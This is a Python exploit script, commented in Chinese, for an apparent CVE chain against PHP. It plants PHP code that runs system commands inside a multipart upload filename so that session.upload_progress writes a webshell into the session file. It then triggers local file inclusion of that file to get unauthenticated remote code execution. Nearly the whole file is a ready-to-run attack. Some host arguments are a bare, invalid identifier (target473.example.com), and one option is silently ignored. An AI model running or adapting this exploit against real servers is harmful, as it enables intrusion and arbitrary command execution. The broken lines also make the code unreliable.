#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
CVE-2026-109618 / CVE-2026-109619 - Chain A
session.upload_progress 会话文件注入 + LFI -> 预认证 RCE

条件:
  1. session.upload_progress.enabled = On (PHP 5.4+ 默认开启)
  2. 应用存在任意 LFI (include/require 用户可控路径)
  3. 会话保存路径已知 (通常是 /tmp 或 /var/lib/php/sessions)
  4. session.use_only_cookies = 0, 或可直接带 Cookie 设置 PHPSESSID

原理: multipart 上传的文件名被原样写入 session 文件, 不做任何转义/编码。
      因此把 <?php ... ?> 塞进 filename, 会话文件就变成 webshell。
"""

import argparse
import socket
import sys
import uuid

BOUNDARY = "AAABBBCCC"


def send_raw(host, port, data, timeout=15):
    s = socket.create_connection((host, port), timeout=timeout)
    s.sendall(data)
    s.settimeout(timeout)
    resp = b""
    while True:
        try:
            d = s.recv(65536)
            if not d:
                break
            resp += d
        except socket.timeout:
            break
        except ConnectionResetError:
            break
    s.close()
    return resp


def inject_session(host, port, path, sid, php_code):
    """把 PHP 代码写进 filename, 同时用 body 里的 PHPSESSID 字段固定 session id。"""
    body = (
        b"--" + BOUNDARY.encode() + b"\r\n"
        b'Content-Disposition: form-data; name="PHPSESSID"\r\n\r\n' + sid.encode() + b"\r\n"
        b"--" + BOUNDARY.encode() + b"\r\n"
        b'Content-Disposition: form-data; name="PHP_SESSION_UPLOAD_PROGRESS"\r\n\r\nx\r\n'
        b"--" + BOUNDARY.encode() + b"\r\n"
        b'Content-Disposition: form-data; name="f"; filename="' + php_code.encode("latin-1") + b'"\r\n\r\n'
        b"Z\r\n"
        b"--" + BOUNDARY.encode() + b"--\r\n"
    )
    req = (
        "POST %s HTTP/1.1\r\n"
        "Host: %s\r\n"
        "Content-Type: multipart/form-data; boundary=%s\r\n"
        "Content-Length: %d\r\n"
        "Cookie: PHPSESSID=%s\r\n"
        "Connection: close\r\n"
        "\r\n" % (path, host, BOUNDARY, len(body), sid)
    ).encode() + body
    return send_raw(host, port, req)


def trigger_lfi(host, port, lfi_path, session_file, sid):
    url = "%s?page=%s" % (lfi_path, session_file)
    req = (
        "GET %s HTTP/1.1\r\n"
        "Host: %s\r\n"
        "Cookie: PHPSESSID=%s\r\n"
        "Connection: close\r\n"
        "\r\n" % (url, host, sid)
    ).encode()
    return send_raw(host, port, req)


def main():
    ap = argparse.ArgumentParser(description="Chain A: session.upload_progress + LFI -> RCE")
    ap.add_argument("--host", default="127.0.0.1")
    ap.add_argument("--port", type=int, default=18080)
    ap.add_argument("--inject-path", default="/example.com", help="任意 PHP 端点(用于投毒会话)")
    ap.add_argument("--lfi-path", default="/vuln.php", help="存在 LFI 的路径")
    ap.add_argument("--lfi-param", default="page", help="LFI 参数名")
    ap.add_argument("--session-path", default="/tmp", help="目标上的 session.save_path")
    ap.add_argument("--command", default="id", help="要执行的命令")
    ap.add_argument("--sid", default="", help="自定义 session id")
    args = ap.parse_args()

    sid = args.sid or ("exploit_" + uuid.uuid4().hex[:20])
    session_file = "%s/sess_%s" % (args.session_path.rstrip("/"), sid)
    cmd = args.command.replace("'", "'\"'\"'")
    php_code = "<?php echo '___START___'; system('%s'); echo '___END___';?>" % cmd

    print("[*] Target      : %s:%d" % (target473.example.com, args.port))
    print("[*] SID         : %s" % sid)
    print("[*] Session file: %s" % session_file)
    print("[*] Command     : %s" % args.command)
    print()

    print("[1] 通过 upload_progress 注入 PHP 代码到会话文件...")
    resp1 = inject_session(target473.example.com, args.port, args.inject_path, sid, php_code)
    status1 = resp1.split(b"\r\n", 1)[0].decode("latin1", "replace") if resp1 else "NO RESPONSE"
    print("    Status: %s" % status1)

    print()
    print("[2] 触发 LFI 包含被投毒的会话文件...")
    lfi_path = args.lfi_path
    if args.lfi_param != "page":
        lfi_path = lfi_path  # 参数名由 trigger_lfi 固定为 page, 如需自定义见下方
    resp2 = trigger_lfi(target473.example.com, args.port, lfi_path, session_file, sid)
    body = resp2.split(b"\r\n\r\n", 1)[-1] if b"\r\n\r\n" in resp2 else resp2

    if b"___START___" in body and b"___END___" in body:
        start = body.index(b"___START___") + len(b"___START___")
        end = body.index(b"___END___")
        output = body[start:end].decode("latin1", "replace").strip()
        print()
        print("[+] RCE CONFIRMED!")
        print("[+] 命令输出:")
        print("    %s" % output)
        return 0

    status2 = resp2.split(b"\r\n", 1)[0].decode("latin1", "replace") if resp2 else "NO RESPONSE"
    print("    Status: %s" % status2)
    print("    Body(%d bytes): %s" % (len(body), body[:300]))
    print("[-] 未确认 RCE - 检查 LFI 路径 / session.save_path / upload_progress 开关")
    return 1


if __name__ == "__main__":
    sys.exit(main())
